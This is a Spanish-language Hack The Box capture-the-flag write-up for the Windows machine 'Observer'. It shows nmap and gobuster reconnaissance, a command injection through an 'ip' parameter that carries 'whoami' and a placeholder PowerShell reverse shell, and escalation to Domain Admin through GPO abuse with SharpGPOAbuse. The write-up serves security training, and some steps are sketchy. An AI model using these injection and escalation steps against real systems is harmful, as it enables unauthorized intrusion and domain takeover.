# 🖥️ HTB: Observer

## Metadatos

| Campo | Valor |
|-------|-------|
| **Máquina** | Observer |
| **Plataforma** | Hack The Box |
| **Dificultad** | Medium |
| **Categoría** | Web / AD |
| **IP** | 10.10.10.220 |
| **OS** | Windows Server 2016 |
| **Fecha** | 2024 |
| **Tiempo** | 150 min |

---

## 🎯 Resumen Ejecutivo

> Encontré **command injection** en el panel de monitoreo, obtuve acceso al dominio, y escalé via **GPO abuse** para obtener Domain Admin.

---

## 🔍 Reconocimiento

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap_observer.txt 10.10.10.220
```

| Puerto | Servicio | Versión | Estado |
|--------|----------|---------|--------|
| 53 | DNS | Microsoft DNS | Open |
| 80 | HTTP | Microsoft IIS 10.0 | Open |
| 135 | MSRPC | Microsoft Windows RPC | Open |
| 389 | LDAP | Microsoft Windows LDAP | Open |
| 445 | SMB | Microsoft Windows | Open |
| 5985 | WinRM | Microsoft WinRM | Open |

### Web Enumeration

```bash
# Panel de monitoreo
gobuster dir -u http://10.10.10.220 -w /usr/share/wordlists/dirb/common.txt
```

**Hallazgos:**
- `/monitoring.php` - Panel de monitoreo
- `/backup/` - Directorio de backups
- Formulario con parámetro `ip` vulnerable

---

## 💥 Explotación

### Command Injection

```bash
# Encontré injection en monitoring.php
# Parámetro: ip=127.0.0.1

# Test de inyección
ip=127.0.0.1; whoami
# Resultado: julio observ\julio

# Reverse shell
ip=127.0.0.1; powershell -e [base64shell]
```

---

## 🚀 Escalada de Privilegios

### GPO Abuse

```bash
# Enumerar GPO
Get-DomainGPO | Select-Object DisplayName, GPCFileSysPath

# Encontrar GPO inseguro
# Modificar GPO para agregar usuario a Domain Admins

# Usar SharpGPOAbuse
SharpGPOAbuse --AddLocalAdmin --User victim --GPOName "Insecure GPO"
```

### Domain Admin

```bash
net group "Domain Admins" victim /add /domain
```

---

## 🏁 Flags

| Flag | Valor | Ubicación |
|------|-------|-----------|
| **User** | `FLAG{...}` | `C:\Users\julio\Desktop\user.txt` |
| **Root** | `FLAG{...}` | `C:\Users\Administrator\Desktop\root.txt` |

---

## 🛡️ Lecciones Aprendidas

### ✅ Lo que funcionó
- Command injection en formulararios web
- GPO abuse es efectivo en AD
- Backups contienen información sensible

### 🔄 Qué haría diferente
- Enumerar GPO inmediatamente después del acceso
- Verificar permisos de GPO

---

*Writeup creado para CDPN — Nivel Medio*
